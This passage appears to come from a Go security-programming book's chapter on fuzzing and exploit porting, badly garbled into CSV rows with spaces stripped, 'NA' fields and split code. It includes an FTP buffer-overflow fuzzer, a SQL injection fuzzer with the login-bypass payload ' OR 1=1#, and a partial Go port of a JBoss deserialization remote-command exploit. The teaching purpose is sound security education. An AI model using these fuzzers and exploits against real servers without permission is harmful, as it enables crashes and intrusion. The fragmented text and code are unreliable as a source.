inputthantheapplicationhasallocatedmemoryspacefor.For ,NA,NA
"example,ausercouldsubmit5,000characterswhenthe ",NA,NA
applicationexpectstoreceiveonly5.Ifaprogramusesthe ,NA,NA
"wrongtechniques,thiscouldallowtheusertowritethat ",NA,NA
surplusdatatopartsofmemorythataren’tintendedforthat ,NA,NA
purpose.This“overflow”corruptsthedatastoredwithin ,NA,NA
"adjacentmemorylocations,allowingamalicioususerto ",NA,NA
potentiallycrashtheprogramoralteritslogicalflow.,NA,NA
Bufferoverflowsareparticularlyimpactfulfornetwork-,NA,NA
basedprogramsthatreceivedatafromclients.Usingbuffer ,NA,NA
"overflows,aclientcandisruptserveravailabilityorpossibly",NA,NA
achieveremotecodeexecution.It’sworthrestating:don’tfuzz ,NA,NA
systemsorapplicationsunlessyouarepermittedtodoso.In ,NA,NA
"addition,makesureyoufullyunderstandtheconsequencesof ",NA,NA
crashingthesystemorservice.,NA,NA
HowBufferOverflowFuzzingWorks,NA,NA
Fuzzingtocreateabufferoverflowgenerallyinvolves ,NA,NA
"submittingincreasinglylongerinputs,suchthateach ",NA,NA
subsequentrequestincludesaninputvaluewhoselengthison,NA,NA
e characterlongerthanthepreviousattempt.Acontrived ,NA,NA
exampleusingthe,NA,NA
A,NA,NA
characterasinputwouldexecute ,NA,NA
accordingtothepatternshownin,NA,NA
Table9-1,NA,NA
.,NA,NA
"Bysendingnumerousinputstoavulnerablefunction, ",NA,NA
you’lleventuallyreachapointwherethelengthofyourinput ,NA,NA
"exceedsthefunction’sdefinedbuffersize,whichwillcorrupt ",NA,NA
"theprogram’scontrolelements,suchasitsreturnand ",NA,NA
"instructionpointers.Atthispoint,theapplicationorsystem ",NA,NA
willcrash.,NA,NA
"Bysendingincrementallylargerrequestsforeachattempt, ",NA,NA
"youcanpreciselydeterminetheexpectedinputsize,whichis ",NA,NA
importantforexploitingtheapplicationlater.Youcanthen ,NA,NA
inspectthecrashorresultingcoredumptobetterunderstand ,NA,NA
thevulnerabilityandattempttodevelopaworkingexploit.We ,NA,NA
won’tgointodebuggerusageandexploitdevelopmenthere; ,NA,NA
"instead,let’sfocusonwritingthefuzzer.","Table9-1:
 InputValuesinaBufferOverflowTest
  
 Attempt 
  
 Inputvalue
  
 1 
  
 A",NA
"Ifyou’vedoneanymanualfuzzingusingmodern, ",NA,NA
"interpretedlanguages,you’veprobablyusedaconstructto ",NA,NA
"createstringsofspecificlengths.Forexample,thefollowing ",NA,NA
"Pythoncode,runwithintheinterpreterconsole,showshow ",NA,NA
simpleitistocreateastringof25,NA,NA
A,NA,NA
characters:,">>>
 x=""A""*25
  
  
 >>>
 x
  
  
 'AAAAAAAAAAAAAAAAAAAAAAAAA'",NA
"Unfortunately,Gohasnosuchconstructtoconveniently ",NA,NA
buildstringsofarbitrarylength.You’llhavetodothattheold-,NA,NA
fashionedway—usingaloop—whichwouldlooksomething ,NA,NA
likethis:,"var(
  
  
 nint
  
  
 sstring
  
  
 )
  
  
 forn=0;n<25;n++{
  
  
 s+=""A""
  
  
 }",NA
"Sure,it’salittlemoreverbosethanthePythonalternative, ",NA,NA
butnotoverwhelming.,NA,NA
Theotherconsiderationyou’llneedtomakeisthedelivery ,NA,NA
mechanismforyourpayload.Thiswilldependonthetarget,NA,NA
"applicationorsystem.Insomeinstances,thiscouldinvolve ",NA,NA
"writingafiletoadisk.Inothercases,youmightcommunicate ",NA,NA
"overTCP/UDPwithanHTTP,SMTP,SNMP,FTP,Telnet,or ",NA,NA
othernetworkedservice.,NA,NA
"Inthefollowingexample,you’llperformfuzzingagainsta ",NA,NA
remoteFTPserver.Youcantweakalotofthelogicwe ,NA,NA
"presentfairlyquicklytooperateagainstotherprotocols,soit ",NA,NA
shouldactasagoodbasisforyoutodevelopcustomfuzzers ,NA,NA
againstotherservices.,NA,NA
AlthoughGo’sstandardpackagesincludesupportforsome ,NA,NA
"commonprotocols,suchasHTTPandSMTP,theydon’t ",NA,NA
includesupportforclient-,NA,NA
"serverFTPinteractions.Instead,you coulduseathird-",NA,NA
partypackagethatalreadyperformsFTP ,NA,NA
"communications,soyoudon’thavetoreinventthewheeland ",NA,NA
"writesomethingfromthegroundup.However,formaximum ",NA,NA
"control(andtoappreciatetheprotocol),you’llinsteadbuild ",NA,NA
thebasicFTPfunctionalityusingrawTCPcommunications.If ,NA,NA
"youneedarefresheronhowthisworks,referto",NA,NA
Chapter2,NA,NA
.,NA,NA
BuildingTheBufferOverflowFuzzer,NA,NA
Listing9-1,NA,NA
showsthefuzzercode.(Allthecodelistingsatthe ,NA,NA
rootlocationof/existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/,NA,NA
.)We’vehardcodedsome ,NA,NA
"values,suchasthetargetIPandport,aswellasthemaximum ",NA,NA
lengthofyourinput.Thecodeitselffuzzesthe,USER,NA
property.,NA,NA
"Sincethispropertyoccursbeforeauserisauthenticated,it ",NA,NA
representsacommonlytestablepointontheattacksurface.,NA,NA
Youcouldcertainlyextendthiscodetotestotherpre-,NA,NA
"authenticationcommands,suchas",PASS,NA
",butkeepinmindthat",NA,NA
ifyousupplyalegitimateusernameandthenkeepsubmitting,NA,NA
inputsfor,PASS,NA
",youmightgetlockedouteventually.","funcmain(){
  
  
 ❶fori:=0;i<2500;i++{
  
   
 ❷conn,err:=net.Dial(""tcp"",""10.0.1.20:21"") 
  
 iferr!=nil{
  
    
 ❸log.Fatalf(""[!]Erroratoffset%d:%s\n"",i,err) }
  
   
 ❹bufio.NewReader(conn).ReadString('\n')
  
  
 user:=""""
  
  
 ❺forn:=0;n<=i;n++{ 
  
 user+=""A""
  
 }
  
 raw:=""USER%s\n""
  
  
 ❻fmt.Fprintf(conn,raw,user) 
  
 bufio.NewReader(conn).ReadString('\n')
  
 raw=""PASSpassword\n""
  
 fmt.Fprint(conn,raw)
  
 bufio.NewReader(conn).ReadString('\n')
  
 iferr:=conn.Close()❼;err!=nil{
  
  
 ❽log.Println(""[!]Erroratoffset%d:%s\n"",i,err)
  
 }
  
 }
  
 }
  
 Listing9-1:Abufferoverflowfuzzer(
 /ch-9/ftp-fuzz/main.go
 )",NA
"Thecodeisessentiallyonelargeloop,beginningat❶. ",NA,NA
"Eachtimetheprogramloops,itaddsanothercharactertothe",NA,NA
"usernameyou’llsupply.Inthiscase,you’llsendusernames",NA,NA
"from1to2,500charactersinlength.",NA,NA
"Foreachiterationoftheloop,youestablishaTCP ",NA,NA
connectiontothedestinationFTPserver❷.Anytimeyou ,NA,NA
"interactwiththeFTPservice,whetherit’stheinitial",NA,NA
"connectionorthesubsequentcommands,youexplicitlyread ",NA,NA
theresponsefromtheserverasasingleline❹.Thisallows ,NA,NA
thecodetoblockwhilewaitingfortheTCPresponsessoyou ,NA,NA
"don’tsendyourcommandsprematurely,beforepacketshave ",NA,NA
madetheirroundtrip.Youthenuseanother,for,NA
looptobuild ,NA,NA
thestringof,NA,NA
A,NA,NA
sinthemannerweshowedpreviously❺.You ,NA,NA
usetheindex,i,NA
oftheouterlooptobuildthestringlength,NA,NA
"dependentonthecurrentiterationoftheloop,sothatit ",NA,NA
increasesbyoneeachtimetheprogramstartsover.Youuse ,NA,NA
thisvaluetowritethe,USER,NA
commandbyusing,"fmt.Fprintf(conn, 
 raw,user)",NA
❻.,NA,NA
AlthoughyoucouldendyourinteractionwiththeFTP ,NA,NA
"serveratthispoint(afterall,you’refuzzingonlythe",USER,NA
"command),youproceedtosendthe",PASS,NA
commandto,NA,NA
"completethetransaction.Lastly,youcloseyourconnection ",NA,NA
cleanly❼.,NA,NA
"It’sworthnotingthattherearetwopoints,❸and❽, ",NA,NA
whereabnormalconnectivitybehaviorcouldindicateaservic,NA,NA
"e disruption,implyingapotentialbufferoverflow:whenthe ",NA,NA
connectionisfirstestablishedandwhentheconnectioncloses. ,NA,NA
Ifyoucan’testablishaconnectionthenexttimetheprogram ,NA,NA
"loops,it’slikelythatsomethingwentwrong.You’llthenwant ",NA,NA
tocheckwhethertheservicecrashedasaresultofabuffer ,NA,NA
overflow.,NA,NA
"Ifyoucan’tcloseaconnectionafteryou’veestablishedit, ",NA,NA
thismayindicatetheabnormalbehavioroftheremoteFTP ,NA,NA
"serviceabruptlydisconnecting,butitprobablyisn’tcausedby ",NA,NA
"abufferoverflow.Theanomalousconditionislogged,butthe ",NA,NA
programwillcontinue.,NA,NA
"Apacketcapture,illustratedin",NA,NA
Figure9-1,NA,NA
",showsthateach",NA,NA
subsequent,USER,NA
"commandgrowsinlength,confirmingthat",NA,NA
yourcodeworksasdesired.,"Figure9-1:AWiresharkcapturedepictingthe
 USER
 commandgrowingbyone 
 lettereachtimetheprogramloops",NA
Youcouldimprovethecodeinseveralwaysforflexibility ,NA,NA
"andconvenience.Forexample,you’dprobablywantto ",NA,NA
"removethehardcodedIP,port,anditerationvalues,and ",NA,NA
insteadincludethemviacommandlineargumentsora ,NA,NA
configurationfile.Weinviteyoutoperformtheseusability ,NA,NA
"updatesasanexercise.Furthermore,youcouldextendthe ",NA,NA
"codesoitfuzzescommandsafterauthentication.Specifically, ",NA,NA
youcouldupdatethetooltofuzzthe,CWD,NA
/,CD,NA
command.,NA,NA
Varioustoolshavehistoricallybeensusceptibletobuffer ,NA,NA
"overflowsrelatedtothehandlingofthiscommand,makingita ",NA,NA
goodtargetforfuzzing.,NA,NA
SQLInjectionFuzzing,NA,NA
SQLInjectionFuzzing,NA,NA
"Inthissection,you’llexploreSQLinjectionfuzzing.Instead ",NA,NA
"ofchangingthelengthofeachinput,thisvariationonthe ",NA,NA
attackcyclesthroughadefinedlistofinputstoattemptto ,NA,NA
"causeSQLinjection.Inotherwords,you’llfuzztheusername ",NA,NA
parameterofawebsiteloginformbyattemptingalistof ,NA,NA
inputsconsistingofvariousSQLmeta-charactersandsyntax ,NA,NA
"that,ifhandledinsecurelybythebackenddatabase,willyield ",NA,NA
abnormalbehaviorbytheapplication.,NA,NA
"Tokeepthingssimple,you’llbeprobingonlyforerror-",NA,NA
"basedSQLinjection,ignoringotherforms,suchasboolean-, ",NA,NA
"time-,andunion-based.Thatmeansthatinsteadoflookingfor ",NA,NA
"subtledifferencesinresponsecontentorresponsetime,you’ll ",NA,NA
lookforanerrormessageintheHTTPresponsetoindicatea ,NA,NA
SQLinjection.Thisimpliesthatyouexpectthewebserverto ,NA,NA
"remainoperational,soyoucannolongerrelyonconnection ",NA,NA
establishmentasalitmustestforwhetheryou’vesucceededin ,NA,NA
"creatingabnormalbehavior.Instead,you’llneedtosearchthe ",NA,NA
responsebodyforadatabaseerrormessage.,NA,NA
HowSQLInjectionWorks,NA,NA
"Atitscore,SQLinjectionallowsanattackertoinsertSQL meta-",NA,NA
"charactersintoastatement,potentiallymanipulatingthe ",NA,NA
"querytoproduceunintendedbehaviororreturnrestricted, ",NA,NA
sensitivedata.Theproblemoccurswhendevelopersblindly ,NA,NA
"concatenateuntrusteduserdatatotheirSQLqueries,asinthe ",NA,NA
followingpseudocode:,"username=HTTP_GET[""username""]
  
  
 query=""SELECT*FROMusersWHEREuser='""+username+""'""
  
  
 result=db.execute(query)
  
  
 if(len(result)>0){",NA
"Inourpseudocode,theusernamevariableisreaddirectly ",NA,NA
fromanHTTPparameter.Thevalueoftheusernamevariable ,NA,NA
isn’tsanitizedorvalidated.Youthenbuildaquerystringby ,NA,NA
"usingthevalue,concatenatingitontotheSQLquerysyntax ",NA,NA
directly.Theprogramexecutesthequeryagainstthedatabase ,NA,NA
"andinspectstheresult.Ifitfindsatleastonematchingrecord, ",NA,NA
you’dconsidertheauthenticationsuccessful.Thecodeshould ,NA,NA
behaveappropriatelysolongasthesuppliedusername ,NA,NA
consistsofalphanumericandacertainsubsetofspecial ,NA,NA
"characters.Forexample,supplyingausernameof",alice,NA
results,NA,NA
inthefollowingsafequery:,SELECT*FROMusersWHEREuser='alice',NA
"However,whathappenswhentheusersuppliesausernam",NA,NA
e containinganapostrophe?Supplyingausernameof,o'doyle,NA
producesthefollowingquery:,"SELECT*FROMusersWHEREuser='o'
 doyle'",NA
Theproblemhereisthatthebackenddatabasenowseesan ,NA,NA
unbalancednumberofsinglequotationmarks.Noticethe ,NA,NA
"emphasizedportionoftheprecedingquery,",NA,NA
doyle,NA,NA
;thebacken,NA,NA
"d databaseinterpretsthisasSQLsyntax,sinceit’soutsidethe ",NA,NA
"enclosingquotes.This,ofcourse,isinvalidSQLsyntax,and ",NA,NA
thebackenddatabasewon’tbeabletoprocessit.Forerror-,NA,NA
"basedSQLinjection,thisproducesanerrormessageinthe ",NA,NA
HTTPresponse.Themessageitselfwillvarybasedonthe,NA,NA
"database.InthecaseofMySQL,you’llreceiveanerror ",NA,NA
"similartothefollowing,possiblywithadditionaldetails ",NA,NA
disclosingthequeryitself:,YouhaveanerrorinyourSQLsyntax,NA
"Althoughwewon’tgotoodeeplyintoexploitation,you ",NA,NA
couldnowmanipulatetheusernameinputtoproduceavalid ,NA,NA
SQLquerythatwouldbypasstheauthenticationinour ,NA,NA
example.Theusernameinput,'OR1=1#,NA
doesjustthatwhen,NA,NA
placedinthefollowingSQLstatement:,SELECT*FROMusersWHEREuser=''OR1=1#',NA
Thisinputappendsalogical,OR,NA
ontotheendofthequery.,NA,NA
This,OR,NA
"statementalwaysevaluatestotrue,because1always",NA,NA
equals1.YouthenuseaMySQLcomment(,#,NA
)toforcethe,NA,NA
backenddatabasetoignoretheremainderofthequery.This ,NA,NA
"resultsinavalidSQLstatementthat,assumingoneormore ",NA,NA
"rowsexistinthedatabase,youcanusetobypass ",NA,NA
authenticationintheprecedingpseudocodeexample.,NA,NA
BuildingtheSQLInjectionFuzzer,NA,NA
Theintentofyourfuzzerwon’tbetogenerateasyntactically ,NA,NA
validSQLstatement.Quitetheopposite.You’llwanttobreak ,NA,NA
thequerysuchthatthemalformedsyntaxyieldsanerrorby ,NA,NA
"thebackenddatabase,astheO’Doyleexamplejust ",NA,NA
"demonstrated.Forthis,you’llsendvariousSQLmeta-",NA,NA
charactersasinput.,NA,NA
Thefirstorderofbusinessistoanalyzethetargetrequest. ,NA,NA
"ByinspectingtheHTMLsourcecode,usinganintercepting",NA,NA
"proxy,orcapturingnetworkpacketswithWireshark,you",NA,NA
determinethattheHTTPrequestsubmittedfortheloginportal ,NA,NA
resemblesthefollowing:,"POST/WebApplication/login.jspHTTP/1.1
  
 Host:10.0.1.20:8080 
  
 User-Agent:Mozilla/5.0(X11;Ubuntu;Linuxx86_64;rv:54.0)Gecko/20100101 
 Firefox/54.0 
  
 Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
  
 Accept-Language:en-US,en;q=0.5 
  
 Accept-Encoding:gzip,deflate 
  
 Content-Type:application/x-www-form-urlencoded 
  
 Content-Length:35 
  
 Referer:http://10.0.1.20:8080/WebApplication/ 
  
 Cookie:JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571 
  
 Connection:keep-alive
  
 Upgrade-Insecure-Requests:1
  
  
 username=someuser&password=somepass",NA
TheloginformsendsaPOSTrequestto ,NA,NA
http://10.0.1.20:8080/WebApplication/login.jsp,NA,NA
.Therearet,NA,NA
wo ,NA,NA
formparameters:,username,NA
and,password,NA
".Forthisexample,we’ll",NA,NA
limitthefuzzingtothe,username,NA
fieldforbrevity.Thecodeitself,NA,NA
"isfairlycompact,consistingofafewloops,someregular ",NA,NA
"expressions,andthecreationofanHTTPrequest.It’sshown ",NA,NA
in,NA,NA
Listing9-2,NA,NA
.,"funcmain(){
  
 ❶payloads:=[]string{ 
  
 ""baseline"",
  
 "")"", 
  
 ""("", 
  
 ""\"""", 
  
 ""'"",
  
 }",NA
Thecodebeginsbydefiningasliceofpayloadsyouwant ,NA,NA
toattempt❶.Thisisyourfuzzinglistthatyou’llsupplylater ,NA,NA
asthevalueofthe,username,NA
"requestparameter.Inthesamevein,",NA,NA
youdefineasliceofstringsthatrepresentkeywordswithinan ,NA,NA
SQLerrormessage❷.Thesewillbethevaluesyou’llsearch ,NA,NA
forintheHTTPresponsebody.Thepresenceofanyofthese,NA,NA
valuesisastrongindicatorthatanSQLerrormessageis,NA,NA
"present.Youcouldexpandonbothoftheselists,butthey’re",NA,NA
adequatedatasetsforthisexample.,NA,NA
"Next,youperformsomepreprocessingwork.Foreachof",NA,NA
"theerrorkeywordsyouwishtosearchfor,youbuildand ",NA,NA
compilearegularexpression❸.Youdothisworkoutside ,NA,NA
yourmainHTTPlogicsoyoudon’thavetocreateand,NA,NA
"compiletheseregularexpressionsmultipletimes,oncefor",NA,NA
"eachpayload.Aminoroptimization,nodoubt,butgood",NA,NA
practicenonetheless.You’llusethesecompiledregular,NA,NA
expressionstopopulateaseparatesliceforuselater.,NA,NA
Nextcomesthecorelogicofthefuzzer.Youloopthrough ,NA,NA
"eachofthepayloads❹,usingeachtobuildanappropriate ",NA,NA
HTTPrequestbodywhose,username,NA
valueisyourcurrent ,NA,NA
payload❺.YouusetheresultingvaluetobuildanHTTP ,NA,NA
"POSTrequest❻,targetingyourloginform.Youthensetthe ",Content-Type,NA
headerandsendtherequestbycalling,client.Do(req),NA
.,NA,NA
Noticethatyousendtherequestbyusingthelong-form ,NA,NA
processofcreatingaclientandanindividualrequestandthen ,NA,NA
calling,client.Do(),NA
.YoucertainlycouldhaveusedGo’s,http.PostForm(),NA
functiontoachievethesamebehaviormore,NA,NA
"concisely.However,themoreverbosetechniquegivesyou ",NA,NA
moregranularcontroloverHTTPheadervalues.Althoughin ,NA,NA
thisexampleyou’resettingonlythe,Content-Type,NA
"header,it’snot",NA,NA
uncommontosetadditionalheadervalueswhenmaking ,NA,NA
HTTPrequests(suchas,User-Agent,NA
",",Cookie,NA
",andothers).You",NA,NA
can’tdothiswith,http.PostForm(),NA
",sogoingthelongroutewill",NA,NA
makeiteasiertoaddanynecessaryHTTPheadersinthe ,NA,NA
"future,particularlyifyou’reeverinterestedinfuzzingthe ",NA,NA
headersthemselves.,NA,NA
"Next,youreadtheHTTPresponsebodybyusing ",ioutil.ReadAll(),NA
"❼.Nowthatyouhavethebody,youloopthrough ",NA,NA
"allofyourprecompiledregularexpressions❽,testingthe ",NA,NA
responsebodyforthepresenceofyourSQLerrorkeywords❾.,NA,NA
"Ifyougetamatch,youprobablyhaveaSQLinjection ",NA,NA
errormessage.Theprogramwilllogdetailsofthepayloadand ,NA,NA
errortothescreenandmoveontothenextiterationofthe loop.,NA,NA
Runyourcodetoconfirmthatitsuccessfullyidentifiesa ,NA,NA
SQLinjectionflawinavulnerableloginform.Ifyousupply ,NA,NA
the,username,NA
"valuewithasinglequotationmark,you’llgetthe",NA,NA
errorindicator,"SQL,",NA
asshownhere:,"$
 gorunmain.go
  
  
 [+]SQLErrorfound('SQL')forpayload:'",NA
Weencourageyoutotrythefollowingexercisestohelp ,NA,NA
"youbetterunderstandthecode,appreciatethenuancesof",NA,NA
"HTTPcommunications,andimproveyourabilitytodetect ",NA,NA
SQLinjection:,"1.
  Updatethecodetotestfortime-basedSQLinjection.Todothis,you’llhaveto 
 sendvariouspayloadsthatintroduceatimedelaywhenthebackendquery 
 executes.You’llneedtomeasuretheround-triptimeandcompareitagainsta 
 baselinerequesttodeducewhetherSQLinjectionispresent.
  
 2.
  Updatethecodetotestforboolean-basedblindSQLinjection.Althoughyoucan 
 usedifferentindicatorsforthis,asimplewayistocomparetheHTTPresponse 
 codeagainstabaselineresponse.Adeviationfromthebaselineresponsecode, 
 particularlyreceivingaresponsecodeof500(internalservererror),maybe 
 indicativeofSQLinjection.
  
 3.
  RatherthanrelyingonGo’snet.httppackagetofacilitatecommunications,try 
 usingthenetpackagetodialarawTCPconnection.Whenusingthenet 
 package,you’llneedtobeawareoftheContent-LengthHTTPheader,which 
 representsthelengthofthemessagebody.You’llneedtocalculatethislength 
 correctlyforeachrequestbecausethebodylengthmaychange.Ifyouusean 
 invalidlengthvalue,theserverwilllikelyrejecttherequest.",NA
"Inthenextsection,we’llshowyouhowtoportexploitsto ",NA,NA
"Gofromotherlanguages,suchasPythonorC.",NA,NA
PORTINGEXPLOITSTOGO,NA,NA
"Forvariousreasons,youmaywanttoportanexistingexploit ",NA,NA
"toGo.Perhapstheexistingexploitcodeisbroken,incomplete, ",NA,NA
orincompatiblewiththesystemorversionyouwishtotarget.,NA,NA
Althoughyoucouldcertainlyextendorupdatethebrokenor ,NA,NA
incompletecodeusingthesamelanguagewithwhichitwas ,NA,NA
"created,Gogivesyoutheluxuryofeasycross-compilation, ",NA,NA
"consistentsyntaxandindentationrules,andapowerful ",NA,NA
standardlibrary.Allofthiswillmakeyourexploitcode ,NA,NA
arguablymoreportableandreadablewithoutcompromisingo,NA,NA
n features.,NA,NA
Likelythemostchallengingtaskwhenportinganexisting,NA,NA
exploitisdeterminingtheequivalentGolibrariesandfunction ,NA,NA
"callstoachievethesameleveloffunctionality.Forexample, ",NA,NA
"addressingendianness,encoding,andencryptionequivalents ",NA,NA
"maytakeabitofresearch,particularlyforthosewhoaren’t ",NA,NA
"wellversedinGo.Fortunately,we’veaddressedthe ",NA,NA
complexityofnetwork-basedcommunicationsinprevious ,NA,NA
"chapters.Theimplementationsandnuancesofthisshould, ",NA,NA
"hopefully,befamiliar.",NA,NA
You’llfindcountlesswaystouseGo’sstandardpackages ,NA,NA
forexploitdevelopmentorporting.Whileit’sunrealisticfor ,NA,NA
ustocomprehensivelycoverthesepackagesandusecasesina ,NA,NA
"singlechapter,weencourageyoutoexploreGo’sofficial ",NA,NA
documentationat,NA,NA
https://golang.org/pkg/,NA,NA
.Thedocumentati,NA,NA
on ,NA,NA
"isextensive,withanabundanceofgoodexamplestohelpyou ",NA,NA
understandfunctionandpackageusage.Herearejustafewof ,NA,NA
thepackagesthatwilllikelybeofgreatestinteresttoyouwhen ,NA,NA
workingwithexploitation:,bytes,NA
Provideslow-levelbytemanipulation,crypto,NA
Implementsvarioussymmetricandasymmetric,NA,NA
ciphersandmessageauthentication,debug,NA
Inspectsvariousfiletypemetadataandcontents,encoding,NA
Encodesanddecodesdatabyusingvarious,NA,NA
"commonformssuchasbinary,Hex,Base64,andmore",ioandbufio,NA
Readsandwritesdatafromandtovarious,NA,NA
"commoninterfacetypesincludingthefilesystem,standard ",NA,NA
"output,networkconnections,andmore",net,NA
Facilitatesclient-serverinteractionbyusingvarious,NA,NA
protocolssuchasHTTPandSMTP,NA,NA
Executesandinteractswiththelocaloperatingsystem,syscall,NA
Exposesaninterfaceformakinglow-levelsystem,NA,NA
calls,unicode,NA
EncodesanddecodesdatabyusingUTF-16orUTF-,NA,NA
8,unsafe,NA
UsefulforavoidingGo’stypesafetycheckswhen,NA,NA
interactingwiththeoperatingsystem,NA,NA
"Admittedly,someofthesepackageswillprovetobemore ",NA,NA
"usefulinlaterchapters,particularlywhenwediscusslow-level ",NA,NA
"Windowsinteractions,butwe’veincludedthislistforyour ",NA,NA
awareness.Ratherthantryingtocoverthesepackagesin ,NA,NA
"detail,we’llshowyouhowtoportanexistingexploitbyusing ",NA,NA
someofthesepackages.,NA,NA
PortinganExploitfromPython,NA,NA
"Inthisfirstexample,you’llportanexploitoftheJava ",NA,NA
deserializationvulnerabilityreleasedin2015.The ,NA,NA
"vulnerability,categorizedunderseveralCVEs,affectsthe ",NA,NA
"deserializationofJavaobjectsincommonapplications, ",NA,NA
"servers,andlibraries. Thisvulnerabilityisintroducedbya ",1,NA
deserializationlibrarythatdoesn’tvalidateinputpriorto ,NA,NA
server-sideexecution(acommoncauseofvulnerabilities).,NA,NA
"We’llnarrowourfocustoexploitingJBoss,apopularJava ",NA,NA
EnterpriseEditionapplicationserver.At ,NA,NA
https://github.com/roo7break/serialator/blob/master/seri,NA,NA
alator ,NA,NA
.py,NA,NA
",you’llfindaPythonscriptthatcontainslogictoexploit ",NA,NA
thevulnerabilityinmultipleapplications.,NA,NA
Listing9-3,NA,NA
provides ,NA,NA
thelogicyou’llreplicate.,NA,NA
Let’stakealookatwhatyou’reworkingwithhere.The ,NA,NA
"functionreceivesahost,port,SSLindicator,andoperating",NA,NA
"systemcommandasparameters.Tobuildtheproperrequest, ",NA,NA
thefunctionhastocreateapayloadthatrepresentsaserialized ,NA,NA
Javaobject.Thisscriptstartsbyhardcodingaseriesofbytes ,NA,NA
ontoavariablenamed,body_serObj,NA
❶.Thesebyteshavebeen,HivaNetwork.Com,NA
"snippedforbrevity,butnoticetheyarerepresentedinthecode ",NA,NA
"asastringvalue.Thisisahexadecimalstring,whichyou’ll ",NA,NA
needtoconverttoabytearraysothattwocharactersofthe ,NA,NA
"stringbecomeasinglebyterepresentation.Forexample, ",NA,NA
you’llneedtoconvert,AC,NA
tothehexadecimalbyte,\xAC,NA
.To,NA,NA
"accomplishthisconversion,theexploitcodecallsafunction ",NA,NA
named,hex2raw3,NA
.Detailsofthisfunction’sunderlying,NA,NA
"implementationareinconsequential,solongasyouunderstan",NA,NA
d what’shappeningtothehexadecimalstring.,NA,NA
"Next,thescriptcalculatesthelengthoftheoperating ",NA,NA
"systemcommand,andthenappendsthelengthandcommand ",NA,NA
tothe,body_serObj,NA
variable❷.Thescriptcompletesthe ,NA,NA
constructionofthepayloadbyappendingadditionaldatathat ,NA,NA
representstheremainderofyourJavaserializedobjectina ,NA,NA
formatthatJBosscanprocess❸.Oncethepayloadis ,NA,NA
"constructed,thescriptbuildstheURLandsetsupSSLto ",NA,NA
"ignoreinvalidcertificates,ifnecessary❹.Itthensetsthe ",NA,NA
required,Content-Type,NA
and,Content-Length,NA
HTTPheaders❺and ,NA,NA
sendsthemaliciousrequesttothetargetserver❻.,NA,NA
Mostofwhat’spresentedinthisscriptshouldn’tbenewto ,NA,NA
"you,aswe’vecoveredthemajorityofitinpreviouschapters. ",NA,NA
It’snowjustamatterofmakingtheequivalentfunctioncalls ,NA,NA
inaGofriendlymanner.,NA,NA
Listing9-4,NA,NA
showstheGoversionof ,NA,NA
theexploit.,"funcjboss(hoststring,sslbool,cmdstring)(int,error){
  
  
 serializedObject,err:=hex.DecodeString(""ACED0005737
 --SNIPPEDFOR 
 BREVITY--
 017400"")❶
  
 iferr!=nil{
  
  
 return0,err
  
  
 }
  
  
 serializedObject=append(serializedObject,byte(len(cmd)))",NA
Thecodeisnearlyaline-by-linereproductionofthe ,NA,NA
"Pythonversion.Forthisreason,we’vesettheannotationsto ",NA,NA
"alignwiththeirPythoncounterparts,soyou’llbeableto ",NA,NA
followthechangeswe’vemade.,NA,NA
"First,youconstructyourpayloadbydefiningyour ",NA,NA
serializedJavaobject,byte,NA
"slice❶,hardcodingtheportion ",NA,NA
beforeyouroperatingsystemcommand.UnlikethePython ,NA,NA
"version,whichreliedonuser-definedlogictoconvertyour ",NA,NA
hexadecimalstringtoa,byte,NA
"array,theGoversionusesthe",hex.DecodeString(),NA
fromthe,encoding/hex,NA
"package.Next,you",NA,NA
"determinethelengthofyouroperatingsystemcommand,and ",NA,NA
thenappenditandthecommanditselftoyourpayload❷. ,NA,NA
Youcompletetheconstructionofyourpayloadbydecoding ,NA,NA
yourhardcodedhexadecimaltrailerstringontoyourexisting ,NA,NA
payload❸.Thecodeforthisisslightlymoreverbosethanthe ,NA,NA
Pythonversionbecauseweintentionallyaddedinadditional ,NA,NA
"errorhandling,butit’salsoabletouseGo’sstandard",encoding,NA
packagetoeasilydecodeyourhexadecimalstring.,NA,NA
"YouproceedtoinitializeyourHTTPclient❹,configuring ",NA,NA
"itforSSLcommunicationsifrequested,andthenbuilda ",NA,NA
"POSTrequest.Priortosendingtherequest,yousetyour ",NA,NA
necessaryHTTPheaders❺sothattheJBossserverinterprets ,NA,NA
thecontenttypeappropriately.Noticethatyoudon’texplicitly ,NA,NA
setthe,Content-Length,NA
HTTPheader.That’sbecauseGo’s,http,NA
"packagedoesthatforyouautomatically.Finally,yousend",NA,NA
yourmaliciousrequestbycalling,client.Do(req),NA
❻.,NA,NA
"Forthemostpart,thiscodemakesuseofwhatyou’ve ",NA,NA
alreadylearned.Thecodeintroducessmallmodificationssuch ,NA,NA
asconfiguringSSLtoignoreinvalidcertificates❹andadding ,NA,NA
specificHTTPheaders❺.Perhapstheonenovelelementin ,NA,NA
ourcodeistheuseof,hex.DecodeString(),NA
",whichisaGocore",NA,NA
functionthattranslatesahexadecimalstringtoitsequivalent ,NA,NA
byterepresentation.You’dhavetodothismanuallyinPython.,NA,NA
Table9-,NA,NA
2,NA,NA
"showssomeadditional,commonlyencountered ",NA,NA
PythonfunctionsorconstructswiththeirGoequivalents.,NA,NA
Thisisnotacomprehensivelistoffunctionalmappings.,NA,NA
Toomanyvariationsandedgecasesexisttocoverallthe ,NA,NA
possiblefunctionsrequiredforportingexploits.We’rehopeful ,NA,NA
thatthiswillhelpyoutranslateatleastsomeofthemost ,NA,NA
commonPythonfunctionstoGo.,"Table9-2:
 CommonPythonFunctionsandTheirGoEquivalents
  
  
 Python
  
 Go
  
 Notes
  
  
  
 hex(
 x)
  
 fmt.Sprintf(""
 %#x
 "",
  
 Convertsaninteger,
 x
 ,toa
  
 x
 )
  
 lowercasehexadecimalstring,
  
 prefixedwith""0x
 "".
  
  
 ord(
 c
 )
  
 rune(
 c
 )
  
 Usedtoretrievetheinteger
  
 (int32)valueofasingle 
  
 character.Worksforstandard 
  
 8-bitstringsormultibyte 
  
 Unicode.Notethatruneisa 
  
 built-intypeinGoandmakes 
  
 workingwithASCIIand 
  
 Unicodedatafairlysimple.",NA
PortinganExploitfromC,NA,NA
Let’sstepawayfromPythonandfocusonC.Cisarguablya ,NA,NA
"lessreadablelanguagethanPython,yetCsharesmore ",NA,NA
similaritieswithGothanPythondoes.Thismakesporting ,NA,NA
"exploitsfromCeasierthanyoumightthink.Todemonstrate, ",NA,NA
we’llbeportingalocalprivilegeescalationexploitforLinux.,NA,NA
